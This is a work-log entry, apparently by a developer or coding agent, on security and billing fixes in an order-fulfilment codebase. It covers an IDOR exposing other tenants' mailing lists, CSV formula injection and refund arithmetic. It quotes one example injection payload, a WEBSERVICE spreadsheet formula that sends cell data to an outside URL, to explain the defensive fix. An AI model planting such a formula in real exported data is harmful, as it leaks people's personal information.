### [17:40] Ultrareview findings on PR #24 — 8 fixed   (branch: feature/vendor-fulfillment · commits: none yet, working tree)

**Synopsis:** `/ultrareview 24` returned 8 findings (3 normal, 5 nit). All 8 were
re-verified against the code before acting; all 8 were real. Fixed every one,
plus a ninth defect of the same class found while fixing the refund path.

**What worked:** Verifying each finding independently instead of trusting the
report. Two things came out of that: (a) the review's `wc -l 426` for
dispatch-service.ts was right and my first count (`Measure-Object -Line` = 377)
was wrong — that cmdlet does not count blank lines, so never use it for a LOC
rule; (b) the claimed reachability held up in every case, including the
partial-refund UI path (`order-payment-actions.tsx:145` advertises it).

The security fixes:
- **Cross-tenant PII (IDOR).** `loadRecipients` queried `mailing_list_records`
  by a customer-supplied `selectedListId` using the service role (RLS bypassed)
  with no ownership check; `/api/orders/submit` accepts `orderState` as
  `z.record(z.unknown())` and stores it verbatim, so the id is fully attacker-
  controlled. Ported the existing gate from `app/api/accuzip/upload/route.ts`
  into a new module. Principal is `order.created_by`, NOT the actor — an admin
  re-dispatching must not lend privileges to a list the customer cannot read.
- **CSV formula injection (CWE-1236).** `csvCell` escaped only `",\n\r`, so a
  recipient first_name of `=WEBSERVICE("http://…"&B2)` reached the vendor's
  Excel intact. Added `neutralizeSpreadsheetFormula` in dispatch-core, applied
  in both CSV builders. In `sanitizeRedstoneCell` it must run LAST — the
  existing `["',]` strip would otherwise eat the guard apostrophe.

The money fix: `refundPayment` overwrote `amount_refunded` with the current
refund's amount, but the column is declared cumulative
(`20260801000000_orders_refund_columns.sql:25`), so a second partial refund
erased the first and admin revenue (captured − refunded) over-reported by the
difference. Extracted `resolveRefundState` as a pure core (matching
dispatch-core/analytics-core/redstone-core) so the arithmetic is testable.

**Ninth defect, not in the review:** `refundOrder` set `status: 'cancelled'` on
ANY refund, so a $1 goodwill refund on a $100 order cancelled an order that
still mails. Now gated on `isFullRefund`.

Evidence: `npm run typecheck:full` 0 errors; `npm test` 269 passing (was 258,
+11 new); `npm run build` exit 0; `npx eslint` on all 10 changed files → 0
errors, 1 pre-existing `any` warning. All touched files verified ≤350 LOC.

**What did NOT work:** First CAS implementation used `.update(v, {count:'exact'})`
and compared `count !== 1`. Rejected before running: that count is derived from
a `Content-Range` header, and if it ever came back null EVERY admin status
update would throw. Switched to `.select('id')` after the filters and checked
the returned rows — same guarantee, no header dependency.
